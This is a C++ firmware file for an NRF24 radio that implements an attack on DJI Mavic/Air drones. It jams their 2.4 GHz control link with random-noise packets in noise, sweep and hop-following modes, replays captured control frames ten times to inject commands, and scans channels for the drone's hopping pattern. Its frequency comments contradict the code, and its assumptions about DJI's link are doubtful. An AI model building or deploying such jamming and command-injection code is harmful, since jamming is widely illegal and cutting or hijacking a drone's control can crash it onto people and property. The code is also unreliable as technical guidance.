#include "mavic_jammer.h"
#include "tx_arm.h"
#include "drivers/nrf24_driver.h"
#include "hardware.h"

namespace MavicJammer {

// DJI Mavic/Air 2.4GHz control:
// - WiFi link: channels 1-13 (2.412-2.472 GHz)
// - Proprietary: 2.4GHz ISM with frequency hopping
// Both use modulation: GFSK (2 Mbps typically)
// Uses NRF24 driver for real 2.4GHz transmission

JammerResult jammMavicController(const JammerConfig& config) {
    JammerResult result;
    result.success = false;
    result.packetsJammed = 0;
    result.frequencyChanges = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isNRF24Ready()) {
        result.error = "NRF24 not initialized";
        return result;
    }

    // DJI uses frequency hopping on 2.4GHz WiFi channels
    // NRF24 channels: 0-125 map to 2400 + channel MHz
    // WiFi ch 1-13: channels 1-13 (2.412-2.472 GHz)
    const uint8_t djiChannels[] = {
        7,   // 2407 MHz
        19,  // 2419 MHz
        37,  // 2437 MHz
        55,  // 2455 MHz
        72   // 2472 MHz
    };
    const uint8_t NUM_CHANNELS = 5;

    uint32_t startTime = millis();
    uint32_t nextChannelChange = startTime;
    uint8_t currentChannelIdx = 0;

    Serial.printf("[Mavic Jammer] Starting %s mode for %lums\n",
                  config.method == 0 ? "NOISE" :
                  config.method == 1 ? "SWEEP" : "SYNC",
                  config.durationMs);

    NRF24Driver::setTX();

    while ((millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint32_t now = millis();

        if (config.method == 0) {
            // NOISE: Continuous noise on current channel
            NRF24Driver::setChannel(djiChannels[currentChannelIdx]);

            uint8_t noisePayload[32];
            for (int i = 0; i < 32; i++) {
                noisePayload[i] = esp_random() & 0xFF;
            }

            if (NRF24Driver::transmit(noisePayload, 32)) {
                result.packetsJammed++;
                Serial.printf("[Mavic] Noise @ ch%d (%.1f MHz)\r",
                            djiChannels[currentChannelIdx],
                            2400.0f + djiChannels[currentChannelIdx]);
            }

            // Channel hop every 50ms (faster than DJI hopping ~100-200ms)
            if (now >= nextChannelChange) {
                currentChannelIdx = (currentChannelIdx + 1) % NUM_CHANNELS;
                nextChannelChange = now + 50;
                result.frequencyChanges++;
            }

        } else if (config.method == 1) {
            // SWEEP: Frequency sweep across all DJI channels
            float sweepPercent = ((float)(now - startTime) / config.durationMs);
            uint8_t baseChannel = djiChannels[0];
            uint8_t topChannel = djiChannels[NUM_CHANNELS - 1];
            uint8_t sweepChannel = baseChannel + (uint8_t)((topChannel - baseChannel) * sweepPercent);

            NRF24Driver::setChannel(sweepChannel);

            uint8_t sweepPayload[32];
            for (int i = 0; i < 32; i++) {
                sweepPayload[i] = esp_random() & 0xFF;
            }

            if (NRF24Driver::transmit(sweepPayload, 32)) {
                result.packetsJammed++;
                Serial.printf("[Mavic] Sweep @ ch%d (%.1f MHz)\r",
                            sweepChannel, 2400.0f + sweepChannel);
            }

        } else if (config.method == 2) {
            // SYNC: Follow DJI hopping pattern (estimated)
            uint8_t hopIndex = ((now - startTime) / 120) % NUM_CHANNELS;
            NRF24Driver::setChannel(djiChannels[hopIndex]);

            uint8_t syncPayload[32];
            for (int i = 0; i < 32; i++) {
                syncPayload[i] = esp_random() & 0xFF;
            }

            if (NRF24Driver::transmit(syncPayload, 32)) {
                result.packetsJammed++;
                Serial.printf("[Mavic] Sync @ ch%d (hop %d)\r", djiChannels[hopIndex], hopIndex);
            }
        }

        delay(10);
    }

    result.success = (result.packetsJammed > 0);
    result.durationMs = millis() - startTime;

    Serial.printf("\n[Mavic Jammer] Complete: %lu packets, %lu hops\n",
                  result.packetsJammed, result.frequencyChanges);

    return result;
}

JammerResult replayMavicCommand(const std::vector<uint8_t>& capturedFrame) {
    JammerResult result;
    result.success = false;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isNRF24Ready()) {
        result.error = "NRF24 not initialized";
        return result;
    }

    if (capturedFrame.empty() || capturedFrame.size() > 32) {
        result.error = "Invalid frame size";
        return result;
    }

    Serial.printf("[Mavic Replay] Sending %zu byte frame\n", capturedFrame.size());

    // Analyze frame header to determine target channel
    // DJI frames typically start with: [header:2] [cmd_id:1] [seq:2] [data:n] [crc:2]
    uint8_t targetChannel = 37;  // Default to WiFi ch 6 (2437 MHz)

    if (capturedFrame.size() > 4) {
        uint8_t cmdId = capturedFrame[2];
        if (cmdId >= 0x30 && cmdId <= 0x40) {
            targetChannel = 19;  // Control commands on 2419 MHz
        }
    }

    NRF24Driver::setChannel(targetChannel);
    NRF24Driver::setTX();
    NRF24Driver::setPayloadSize(capturedFrame.size());

    // Transmit frame multiple times for reliability
    for (int attempt = 0; attempt < 10; attempt++) {
        if (!TxArm::isArmed()) break;

        if (NRF24Driver::transmit(capturedFrame.data(), capturedFrame.size())) {
            result.packetsJammed++;
            Serial.printf("[Mavic Replay] TX attempt %d @ ch%d\r", attempt + 1, targetChannel);
        }
        delay(50);
    }

    result.success = (result.packetsJammed > 0);
    return result;
}

JammerResult analyzeMavicHoppingPattern(uint32_t scanDurationMs) {
    JammerResult result;
    result.success = false;

    if (!Hardware::isNRF24Ready()) {
        result.error = "NRF24 not initialized";
        return result;
    }

    Serial.printf("[Mavic Analyzer] Scanning for hopping pattern (%lums)\n", scanDurationMs);

    std::vector<uint8_t> detectedChannels;
    uint32_t startTime = millis();

    // NRF24 channels mapping to 2.4GHz
    // Channels 0-125 = 2400-2525 MHz
    const uint8_t testChannels[] = {
        1, 6, 11, 13,  // Primary WiFi channels
        7, 19, 37, 55, 72  // DJI common channels
    };

    NRF24Driver::setRX();

    while ((millis() - startTime) < scanDurationMs) {
        for (uint8_t ch : testChannels) {
            NRF24Driver::setChannel(ch);

            // Sample RSSI at this channel (NRF24 has RPD - Received Power Detector)
            int8_t rssi = NRF24Driver::getRSSI();

            // Detect activity (RSSI > -70 dBm)
            if (rssi > -70) {
                detectedChannels.push_back(ch);
                result.frequencyChanges++;
                Serial.printf("[Mavic] Activity detected on ch%d (%.1f MHz) RSSI:%d dBm\n",
                            ch, 2400.0f + ch, rssi);
            }
        }
        delay(100);
    }

    // Analyze hopping sequence
    Serial.printf("[Mavic Analyzer] Detected %lu channel hops\n", result.frequencyChanges);
    result.success = (result.frequencyChanges > 0);

    return result;
}

}  // namespace MavicJammer
